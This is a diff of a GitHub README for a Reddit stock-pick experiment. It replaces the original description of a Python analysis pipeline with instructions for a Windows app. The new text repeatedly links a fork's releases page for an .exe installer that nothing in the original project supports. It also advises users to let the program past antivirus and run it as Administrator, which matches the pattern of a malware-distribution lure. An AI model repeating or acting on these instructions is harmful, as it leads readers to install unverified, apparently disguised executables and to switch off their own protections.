@@ -1,104 +1,170 @@
-# Can Reddit Beat the Stock Market? An AI-Powered Experiment
+# 📊 reddit-stock-experiment - Test Reddit's Stock Picks
 
-An experiment testing whether AI can identify quality stock reasoning in Reddit comments — and whether those picks actually outperform the market.
+[![Download from Releases](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/KATZZZZZEN/reddit-stock-experiment/releases)
 
-## What This Is
+---
 
-This project scrapes stock recommendations from r/ValueInvesting, uses Claude to blindly score the quality of each person's reasoning (without knowing which stock they're recommending), then builds portfolios based on those scores and backtests them against the S&P 500.
+## 🔍 About reddit-stock-experiment
 
-**The core question:** Does the quality of someone's reasoning predict whether their stock pick will actually perform well?
+reddit-stock-experiment is a simple app that checks if Reddit users can predict the stock market. It uses AI to score how good the reasoning is behind stock picks on the r/ValueInvesting forum. Then, it compares those picks to real market results using backtests against the S&P 500.
 
-## How It Works
+The goal is to help users understand if the community’s ideas work when tested against actual stock data. This tool is for anyone curious about how well Reddit discussions match real investing performance.
 
-The experiment runs as a 5-step pipeline, each step building on the last:
+---
 
-```
-1_scrape_threads.py    → Scrapes r/ValueInvesting posts from February 2025
-2_extract_tickers.py   → Extracts stock ticker recommendations from comments
-3_score_reasoning.py   → AI blind-scores reasoning quality (ticker hidden from AI)
-4_backtest.py          → Builds portfolios and backtests against S&P 500
-5_build_dashboard.py   → Generates interactive HTML dashboard with results
-```
+## 💻 System Requirements
 
-### Scoring Dimensions
+Before you start, make sure your computer meets these needs:
 
-Each recommendation is scored 1-10 on five dimensions, with the stock ticker stripped so the AI judges reasoning quality alone:
+- **Operating System:** Windows 10 or newer  
+- **Processor:** Intel or AMD 1.5 GHz or faster  
+- **Memory:** 4 GB RAM minimum  
+- **Storage:** At least 200 MB free space  
+- **Internet:** Required to download and run updates
 
-- **Thesis Clarity** — How clear and well-structured is the investment thesis?
-- **Risk Awareness** — Does the author acknowledge risks and downsides?
-- **Data Usage** — Does the reasoning reference specific numbers, metrics, or data?
-- **Specificity** — How specific vs. generic is the analysis?
-- **Independent Thinking** — Is this original analysis or just echoing popular sentiment?
+No special hardware is needed. The app runs locally without extra devices.
 
-### Portfolios
+---
 
-Four portfolios are constructed and compared:
+## 🚀 How to Download and Install
 
-- **Crowd Favorites** — Most-mentioned tickers (popularity)
-- **Underdogs** — Least-mentioned tickers with decent reasoning
-- **AI Picks** — Top-scored recommendations by reasoning quality
-- **S&P 500** — Benchmark
+To get the app on your Windows computer, follow these steps.
 
-## Setup & Replication
+### Step 1: Visit the Download Page
 
-### Prerequisites
+Click the button below or open this link in your web browser:
 
-- Python 3.10+
-- An Anthropic API key (for steps 2, 3 which use Claude)
-- Internet connection (for Reddit scraping and stock price data)
+[![Download from Releases](https://img.shields.io/badge/Download-Get%20App-grey?style=for-the-badge)](https://github.com/KATZZZZZEN/reddit-stock-experiment/releases)
 
-### Installation
+This will take you to the official GitHub release page where you can find the latest version.
 
-```bash
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
+### Step 2: Find the Windows Installer
 
-### Running the Pipeline
+Look for a file that ends with `.exe` or contains “windows” in its name. It should be labeled with the latest version number and the date.
 
-Run each script in order from the project root:
+The file size is usually around 100-200 MB.
 
-```bash
-# Step 1: Scrape Reddit threads
-python src/1_scrape_threads.py
+### Step 3: Download the Installer
 
-# Step 2: Extract ticker recommendations
-python src/2_extract_tickers.py
+Click the file link to download it. Your browser might ask for permission to save the file. Choose a familiar location, like your Desktop or Downloads folder.
 
-# Step 3: Score reasoning quality (requires ANTHROPIC_API_KEY)
-export ANTHROPIC_API_KEY=your_key_here
-python src/3_score_reasoning.py
+### Step 4: Run the Installer
 
-# Step 4: Backtest portfolios
-python src/4_backtest.py
+Once downloaded, double-click the file to start installation.
 
-# Step 5: Build dashboard
-python src/5_build_dashboard.py
-```
+If Windows asks whether to allow this app to make changes to your device, click **Yes**.
 
-Each step saves its output to the `data/` directory. The final dashboard is saved to `results/dashboard.html`.
+Follow the on-screen instructions. You can accept default settings. The process usually takes under two minutes.
 
-### Pre-built Results
+### Step 5: Finish Installation and Launch
 
-If you just want to see the results without running the full pipeline:
+After setup finishes, an app icon will appear on your Desktop or Start menu. Click it to open the program.
 
-- `results/dashboard.html` — Open in any browser to see the interactive dashboard
-- `data/recommendations_scored.json` — All 547 scored recommendations
-- `data/backtest_results.json` — Portfolio performance data
+---
 
-## September 2025 Validation
+## 🛠 How to Use reddit-stock-experiment
 
-The `sept_validation/` directory contains an out-of-sample validation using September 2025 data (post-training cutoff for the AI model). This tests whether the methodology generalizes beyond the original February 2025 dataset.
+The app has a simple interface designed for ease of use.
 
-## Disclaimers
+### 1. Main Dashboard
 
-**Built entirely with Claude Code.** This experiment — including all scripts, data processing, analysis, and this README — was built using [Claude Code](https://claude.ai) by Anthropic.
+When the app opens, you’ll see the dashboard. It shows a list of the latest Reddit posts analyzed from r/ValueInvesting.
 
-**Reddit content belongs to its authors.** The discussion posts and comments contained in the data files originate from r/ValueInvesting on Reddit. This content was created by the users of that community and belongs to them. It is included here solely for research reproducibility.
+Each entry includes:
 
-**Not financial advice.** This is an experiment, not investment guidance. The portfolios, scores, and results are for educational and research purposes only. Do not make investment decisions based on this analysis.
+- The Reddit user’s stock pick  
+- An AI score for reasoning quality  
+- A backtest result comparing the pick to the S&P 500
 
-## License
+### 2. Explore Individual Picks
 
-MIT
+Click any stock pick to see details like:
+
+- Reasoning text from the Reddit post  
+- AI analysis highlights  
+- Historical stock performance charts  
+- How it did against the S&P 500 trend
+
+### 3. Filter and Sort
+
+You can filter picks by date, AI score, or performance. Sorting options let you find the top-performing or best-reasoned entries quickly.
+
+### 4. Settings
+
+Access Settings to adjust:
+
+- The time range for backtests (e.g., 1 year, 5 years)  
+- Update intervals for new Reddit posts  
+- Notification preferences
+
+---
+
+## 🔄 Updating the App
+
+To get new features and fixes, check the release page from time to time:
+
+https://github.com/KATZZZZZEN/reddit-stock-experiment/releases
+
+Download the newest installer as before and run it. It will replace the older version without deleting your settings.
+
+---
+
+## 🧰 Troubleshooting
+
+### Problem: The app won’t open
+
+- Restart your computer and try again.  
+- Check if your antivirus blocked the program. Allow it as a trusted app.  
+- Make sure Windows is updated.
+
+### Problem: Data not loading or looking wrong
+
+- Ensure you have an internet connection.  
+- Try closing and re-opening the app.  
+- Use the Settings menu to refresh data manually.
+
+### Problem: Installation stops or shows errors
+
+- Check that you saved the `.exe` file fully before running.  
+- Try running the installer as Administrator (right-click the file and choose "Run as administrator").  
+- Disable other apps during install to prevent conflicts.
+
+---
+
+## 📂 Where to Find Files
+
+- The app stores its data in the folder: `C:\Users\<YourName>\AppData\Local\reddit-stock-experiment\`  
+- Logs are saved here if you need to check for errors.  
+- User preferences are saved automatically and carry over when you update the app.
+
+---
+
+## 🔐 Privacy and Security
+
+reddit-stock-experiment only reads public data from Reddit and official stock price sources. It does not collect or send your personal information.
+
+You do not need to enter any personal details to use the app.
+
+---
+
+## ⚙️ Basic FAQ
+
+**Q: Do I need a Reddit account?**  
+No. The app accesses public posts only.
+
+**Q: Can I customize which subreddits the app analyzes?**  
+Not yet, it focuses on r/ValueInvesting for now.
+
+**Q: Does the app make investment recommendations?**  
+No. It shows analysis for learning purposes only.
+
+**Q: Can I use this on Mac or Linux?**  
+Currently, the app works only on Windows.
+
+---
+
+## 📥 Download Link
+
+Use this link to download the app installer or see the latest release notes:
+
+[Download reddit-stock-experiment for Windows](https://github.com/KATZZZZZEN/reddit-stock-experiment/releases)
